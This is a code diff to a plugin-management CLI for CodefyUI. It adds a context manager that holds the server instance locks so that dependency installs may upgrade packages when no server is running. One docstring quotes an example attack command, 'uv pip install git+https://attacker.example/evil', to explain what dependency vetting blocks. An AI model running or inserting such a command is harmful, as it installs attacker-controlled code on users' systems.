@@ -791,6 +791,34 @@ def _cancel_on_sigint(
             owns_sigint = False
 
 
+@contextlib.contextmanager
+def _server_stopped():
+    """Yield whether no CodefyUI server is running, holding it that way.
+
+    ``True`` holds the server's instance locks (the data directory and the
+    run database this ``cdui`` points at) for the length of the block, so no
+    server can start and import a package while uv replaces it. The install
+    may then upgrade what the venv already has, instead of failing with
+    "stop the server" when there is no server to stop. ``False`` means one is
+    running and the install stays add-only.
+
+    So does anything that keeps the question from being asked. The import is
+    here rather than at the top because ``instance_lock`` reads
+    ``app.config``, which refuses a malformed ``CODEFYUI_*`` setting at
+    import, and commands like ``uninstall`` must not depend on it; a
+    filesystem without locks is the other way to get here.
+    """
+    with contextlib.ExitStack() as stack:
+        try:
+            from app.core import instance_lock  # noqa: PLC0415
+
+            stopped = stack.enter_context(instance_lock.held_if_free(
+                instance_lock.server_locks(), host="", port=0))
+        except Exception:  # noqa: BLE001 -- add-only is always safe
+            stopped = False
+        yield stopped
+
+
 def _report_needs_restart(exc: PluginNeedsRestart) -> int:
     """Say that this cannot be done here, and what to type instead. Exit 3.
 
@@ -846,7 +874,8 @@ def _run_install_flow(
         reporter(payload)
 
     try:
-        with _cancel_on_sigint(reporter) as cancel_check:
+        with _cancel_on_sigint(reporter) as cancel_check, \
+                _server_stopped() as stopped:
             outcome = core_flows.install_plugin_live(
                 plan,
                 emit=emit,
@@ -857,6 +886,7 @@ def _run_install_flow(
                 # name nothing calls -- a suite that passes while downloading
                 # from the real internet.
                 github=sys.modules[__name__],
+                replace_allowed=stopped,
             )
     except PluginCancelled:
         reporter.close()
@@ -1054,7 +1084,9 @@ def _install_deps(deps: dict[str, str]) -> int:
       holding open;
     * when the resolver says that cannot be done, the answer is not "the
       plugin is broken" but "not while the server is running", and exit code
-      3 carries the command to run instead.
+      3 carries the command to run instead. With no server running
+      (:func:`_server_stopped`) the install may upgrade packages instead,
+      keeping only the PyTorch build pinned.
 
     The vetting that keeps ``[python_deps]`` from becoming
     ``uv pip install git+https://attacker.example/evil`` is
@@ -1071,9 +1103,11 @@ def _install_deps(deps: dict[str, str]) -> int:
 
     reporter = _ConsoleReporter()
     try:
-        with _cancel_on_sigint(reporter) as cancel_check:
+        with _cancel_on_sigint(reporter) as cancel_check, \
+                _server_stopped() as stopped:
             core_deps.install_deps_step(
-                specs, emit=reporter, cancel_check=cancel_check
+                specs, emit=reporter, cancel_check=cancel_check,
+                replace_allowed=stopped,
             )
     except PluginCancelled:
         reporter.close()
